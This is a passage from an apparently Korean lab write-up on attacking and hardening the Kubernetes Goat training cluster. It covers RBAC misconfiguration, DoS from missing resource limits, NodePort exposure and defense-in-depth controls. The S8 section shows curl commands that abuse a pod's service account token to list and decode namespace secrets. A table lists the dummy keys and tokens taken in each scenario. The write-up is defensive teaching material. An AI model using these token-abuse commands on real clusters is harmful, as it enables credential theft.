### (B) 와일드카드 권한 Role — `scenarios/hunger-check/deployment.yaml`

```yaml
kind: Role
metadata: { name: secret-reader, namespace: big-monolith }
rules:
- apiGroups: [""]
  resources: ["*"]              # ← 모든 리소스(= Secret 포함)
  verbs: ["get", "watch", "list"]
# → RoleBinding으로 big-monolith-sa(hunger-check 파드)에 부여
```

### 검증

```bash
$ kubectl auth can-i --list --as=system:serviceaccount:big-monolith:big-monolith-sa -n big-monolith
# secrets  [get watch list]  ← Secret 열람 권한 확인
```

### 근본 원인

`cluster-admin` 남발과 `resources: ["*"]` 와일드카드. "일단 되게 하려고" 넓게 준 권한이 파드 침해 시 곧바로 공격자 권한이 됩니다.

### 대응

```yaml
# 최소권한: 정확히 필요한 리소스/동사만
rules:
- apiGroups: [""]
  resources: ["configmaps"]      # secrets 아님, 필요한 것만
  resourceNames: ["app-config"]  # 특정 리소스로 더 좁힘
  verbs: ["get"]
```

- `cluster-admin` 바인딩 금지, `ClusterRole` 대신 네임스페이스 `Role` 우선
- `kubectl auth can-i --list`로 정기 감사, **rbac-tool / kubectl-who-can**으로 과권한 탐지
- 불필요한 토큰 마운트 제거: `automountServiceAccountToken: false`

---

## S8 · 네임스페이스 시크릿 탈취(SA 토큰 악용) `HIGH`

**취약점 클래스**: CWE-522 (Insufficiently Protected Credentials) · MITRE T1528

**개념 — "네임스페이스는 보안 경계가 아니다".** S7의 RBAC를 실제 공격으로 잇습니다. hunger-check 파드를 장악한 공격자는 파드에 자동 마운트된 `big-monolith-sa` 토큰으로 **쿠버네티스 API를 직접 호출**해 네임스페이스 내 모든 Secret을 읽습니다.

### 익스플로잇 (파드 내부에서)

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# ① 네임스페이스의 Secret 목록
$ curl -s --cacert $CA -H "Authorization: Bearer $TOKEN" \
     https://kubernetes.default.svc/api/v1/namespaces/big-monolith/secrets
# → vaultapikey, webhookapikey ...

# ② 값 추출 후 base64 디코드
$ curl ... /secrets/vaultapikey
"k8svaultapikey": "azhzLWdvYXQtODUwNTc4NDZhODA0NmEyNWIzNWYzOGYzYTI2NDlkY2U="

$ base64 -d →  vault  : k8s-goat-85057846a8046a25b35f38f3a2649dce
              webhook: k8s-goat-dfcf630539553ecf9586fdfda1968fec
```

<p align="center"><img src="/assets/img/kubernetes-goat/12-rbac.png" alt="파드 SA 토큰으로 네임스페이스 Secret 탈취" width="560" style="max-width:100%;height:auto"></p>

### 대응

- **S7의 최소권한**이 1차 방어 (애초에 `secrets get` 권한을 주지 않기)
- **etcd 저장 시 암호화** (`EncryptionConfiguration` — aescbc/kms)
- 외부 시크릿 관리(**Vault / External Secrets Operator**)로 Secret 자체를 클러스터 밖에 두기
- Secret 접근 **감사 로깅**(audit policy), 네임스페이스 간 격리는 NetworkPolicy·RBAC로 **명시적으로** 구성

---

## S9 · 리소스 고갈(DoS) `MEDIUM`

**취약점 클래스**: CWE-770 (Allocation without Limits) · MITRE T1499

**개념** — `hunger-check` 파드에는 **resource requests/limits가 전혀 없고**(`resources: {}`), 네임스페이스에 `LimitRange`·`ResourceQuota`도 없습니다. 게다가 인증 없는 웹 터미널이 붙어 있어, 공격자가 메모리/CPU 폭탄을 실행하면 cgroup 상한이 없어 **노드 전체**가 자원 고갈에 빠지고 같은 노드의 다른 파드까지 죽습니다(Noisy Neighbor → DoS).

### 증명

```bash
$ kubectl get pod -n big-monolith -l app=hunger-check -o jsonpath='{...resources}'
{}                                   # requests/limits 없음
$ kubectl get limitrange,resourcequota -n big-monolith
No resources found                   # 네임스페이스 상한도 없음
```

>  **안전 조치** — 호스트(개인 PC) 안정성을 위해 실제 메모리 폭탄(`stress-ng` 등)은 실행하지 않고, **상한 부재라는 구조적 취약성 증명까지만** 수행했습니다.

### 대응

```yaml
# ① 모든 컨테이너에 requests/limits
resources:
  requests: { memory: "64Mi", cpu: "50m" }
  limits:   { memory: "128Mi", cpu: "250m" }
```

```yaml
# ② 네임스페이스 차원 강제
apiVersion: v1
kind: LimitRange
metadata: { name: default-limits, namespace: big-monolith }
spec:
  limits:
  - type: Container
    default:        { memory: "128Mi", cpu: "250m" }
    defaultRequest: { memory: "64Mi",  cpu: "50m" }
---
apiVersion: v1
kind: ResourceQuota
metadata: { name: ns-quota, namespace: big-monolith }
spec:
  hard: { requests.memory: "1Gi", limits.memory: "2Gi", pods: "10" }
```

- 정책엔진으로 limits 없는 파드 거부

---

## S10 · NodePort 노출 & 환경정보 수집 `LOW`

**취약점 클래스**: CWE-668 (Exposure of Resource to Wrong Sphere) · MITRE T1613

### NodePort 노출

내부 전용이어야 할 info-app이 `NodePort`로 열려 있어 **모든 노드 IP의 30003 포트**에 노출됩니다 — ClusterIP였다면 없었을 공격 표면입니다.

```bash
$ kubectl get svc -A | grep NodePort
default  internal-proxy-info-app-service  NodePort  5000:30003/TCP   # 노드 IP:30003 로 외부 접근
```

### 환경정보 수집

어떤 파드든 장악하면 마운트된 SA 토큰·환경변수로 클러스터 지형을 파악할 수 있습니다 — 후속 공격의 정찰 단계입니다.

```bash
$ kubectl exec build-code-... -- env | grep KUBERNETES
KUBERNETES_SERVICE_HOST=10.96.0.1   KUBERNETES_SERVICE_PORT=443
$ ls /var/run/secrets/kubernetes.io/serviceaccount/
token  ca.crt  namespace
```

### 대응

- 외부 노출은 **Ingress/LoadBalancer + 인증**으로 일원화하고 NodePort 남용 지양
- `automountServiceAccountToken: false`로 정찰 재료 제거
- NetworkPolicy로 파드 간·egress 통제, kube-apiserver **익명 접근 차단**(`--anonymous-auth=false`)

---

## 7. 탈취 자산 총정리

초기 웹앱 접근만으로 확보한 자격증명/시크릿을 한 표로 모았습니다. **하나의 침투가 어떻게 연쇄적 자산 탈취로 번지는지**를 보여줍니다.

| # | 출처(시나리오) | 기법 | 탈취 자산 |
|---|---|---|---|
| S1 | build-code | 노출된 `.git` 히스토리 | AWS 키 `AKIVSHD6243H22G1KIDC` + secret key |
| **S3** | **system-monitor** | **컨테이너 이스케이프** | **cluster-admin `admin.conf` + SA 토큰 ×32** |
| S4 | internal-proxy | SSRF → 내부 metadata | `k8s-goat-ca90ef85db7a5aef0198d02fb0df9cab` |
| S5 | poor-registry | 비인증 레지스트리 이미지 | `API_KEY=k8s-goat-cf658c56a501385205cc6d2dafee8fc1` |
| S6 | hidden-in-layers | 이미지 레이어 복원 | `k8s-goat-3b7a7dc7f51f4014ddf3446c25f8b772` |
| S7/S8 | big-monolith | RBAC 오구성 + SA 토큰 | vault `…85057846…` · webhook `…dfcf6305…` |
| — | goatvault | Secret 열람 | `k8s-goat-cd2da272…` |

---

## 8. 심층 방어(Defense-in-Depth) 종합

개별 대응을 계층별로 묶으면 다음과 같습니다. **어느 한 계층이 뚫려도 다음 계층이 피해를 막는 것**이 목표입니다.

| 계층 | 통제 | 차단 시나리오 |
|---|---|---|
| **이미지/공급망** | 시크릿 스캐닝(gitleaks/Trivy), 이미지 서명(cosign), non-root 베이스, multi-stage build | S1·S5·S6 |
| **파드 보안** | Pod Security Admission `restricted`, no privileged/hostPID/hostPath, drop capabilities, readOnlyRootFS, seccomp | S2·S3·S9 |
| **인가(RBAC)** | 최소권한, cluster-admin 금지, 와일드카드 제거, 토큰 자동마운트 off | S3·S7·S8 |
| **네트워크** | NetworkPolicy(기본 deny), egress 제한, NodePort 지양, 내부 mTLS | S4·S8·S10 |
| **데이터** | etcd 암호화, 외부 Secret 매니저, 시크릿 회전 | S4·S5·S8 |
| **탐지/정책** | Kyverno/OPA로 위험 스펙 거부, Falco 런타임 탐지, 감사 로깅 | 전 시나리오 |

### 위험 스펙을 원천 차단하는 Kyverno 정책 예시

```yaml
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata: { name: disallow-host-namespaces-and-privileged }
spec:
  validationFailureAction: Enforce
  rules:
  - name: no-privileged-hostpath
    match: { any: [{ resources: { kinds: ["Pod"] } }] }
    validate:
      message: "privileged/hostPID/hostPath 파드는 금지됩니다."
      pattern:
        spec:
          =(hostPID): "false"
          =(hostIPC): "false"
          containers:
          - =(securityContext):
              =(privileged): "false"
          =(volumes):
          - X(hostPath): "null"
```

> ###  한 줄 결론
> 이번에 성공한 **모든 공격은 결국 위험한 기본값을 방치했기 때문**입니다.
> **① non-root 실행 · ② privileged/hostPath 금지 · ③ 최소권한 RBAC · ④ 기본 거부 NetworkPolicy** — 이 네 가지만 강제해도
> CRITICAL 체인(S3)과 대부분의 시크릿 유출이 끊깁니다. 방어의 핵심은 이를 **배포 파이프라인의 정책(Policy as Code)**으로 옮겨
> 사람의 실수와 무관하게 강제하는 것입니다.

---

## 9. 배운 점과 회고

- **격리는 공짜가 아니다.** 컨테이너가 커널을 공유하는 이상, `privileged`·`hostPath` 같은 편의 옵션 하나가 격리를 통째로 무효화한다. S3에서 **파드 스펙 세 줄**이 웹앱을 클러스터 관리자로 승격시키는 것을 직접 재현하며 이를 체감했다.
- **"내부"라는 신뢰 경계는 착각.** S4의 SSRF와 S8의 네임스페이스 시크릿 탈취는 모두 "내부는 안전하다"는 가정에서 출발한다. 제로 트러스트 관점에서 내부 서비스도 인증·인가·네트워크 정책이 필요하다.
- **시크릿의 생애주기가 중요.** 코드(S1)·이미지 레이어(S6)·레지스트리(S5) 어디에 남기든, 한 번 새어 나간 시크릿은 회전 전까지 유효하다. 저장을 막는 것보다 **애초에 굽지 않고 런타임 주입**하는 설계가 근본 해법.
- **탐지보다 예방(admission).** 런타임 탐지(Falco)도 중요하지만, 애초에 위험 스펙을 **어드미션 단계에서 거부**(PSA/Kyverno)하는 것이 비용 대비 효과가 가장 크다.

---

## 10. 참고자료 · 재현 · 정리

### 저장소 구성

```
.
├── 2026-07-24-kubernetes-goat-cluster-security.md   # 이 포스트 (전체 분석)
├── assets/img/kubernetes-goat/                # 실습 스크린샷
└── evidence/                                        # 각 시나리오 원본 명령 출력 로그
```

### 재현 순서 요약

```bash
winget install -e --id Kubernetes.kind && winget install -e --id Helm.Helm
git clone https://github.com/madhuakula/kubernetes-goat.git && cd kubernetes-goat
kind create cluster --config platforms/kind-setup/kind-cluster-setup.yaml --name kubernetes-goat-cluster
bash setup-kubernetes-goat.sh
bash access-kubernetes-goat.sh   # http://127.0.0.1:1234 접속
```

### 정리(teardown)

```bash
bash teardown-kubernetes-goat.sh
kind delete cluster --name kubernetes-goat-cluster
```

### 참고 링크

- **Kubernetes Goat** — <https://github.com/madhuakula/kubernetes-goat> · 가이드 <https://madhuakula.com/kubernetes-goat/>
- KodeKloud — [Docker for Absolute Beginners](https://learn.kodekloud.com/user/courses/crash-course-docker-for-absolute-beginner) · [Kubernetes for Absolute Beginners](https://learn.kodekloud.com/user/courses/crash-course-kubernetes-for-absolute-beginners)
- **NSA/CISA** — *Kubernetes Hardening Guidance*
- **CIS** — *Kubernetes Benchmark*
- **Kubernetes** — [Pod Security Standards](https://kubernetes.io/docs/concepts/security/pod-security-standards/) · [RBAC](https://kubernetes.io/docs/reference/access-authn-authz/rbac/)
- **MITRE ATT&CK** — [Containers Matrix](https://attack.mitre.org/matrices/enterprise/containers/)

---

<sub>본 문서는 로컬 학습 환경(`kind`)에서 수행한 실습 기록이며, 등장하는 모든 시크릿/키는 Kubernetes Goat가 배포한 <b>더미 값</b>입니다. 실제 시스템에 대한 무단 테스트는 불법입니다.</sub>
